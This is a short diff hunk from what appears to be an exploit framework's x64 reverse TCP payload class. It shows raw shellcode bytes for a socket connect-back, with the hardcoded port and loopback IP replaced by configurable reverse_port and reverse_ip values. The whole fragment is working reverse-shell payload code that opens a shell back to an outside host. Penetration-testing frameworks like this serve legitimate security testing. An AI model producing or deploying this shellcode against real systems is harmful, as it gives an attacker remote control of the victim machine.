@@ -33,8 +33,8 @@ class Exploit(ReverseTCPPayloadMixin, ArchitectureSpecificPayload):
             b"\x0f\x05" +                      # syscall
             b"\x48\x97" +                      # xchg   %rax,%rdi
             b"\x48\xb9\x02\x00" +              # movabs $0x100007fb3150002,%rcx
-            b"\x15\xb3" +                      #
-            b"\x7f\x00\x00\x01" +              #
+            reverse_port +                     # port
+            reverse_ip +                       # ip
             b"\x51" +                          # push   %rcx
             b"\x48\x89\xe6" +                  # mov    %rsp,%rsi
             b"\x6a\x10" +                      # pushq  $0x10
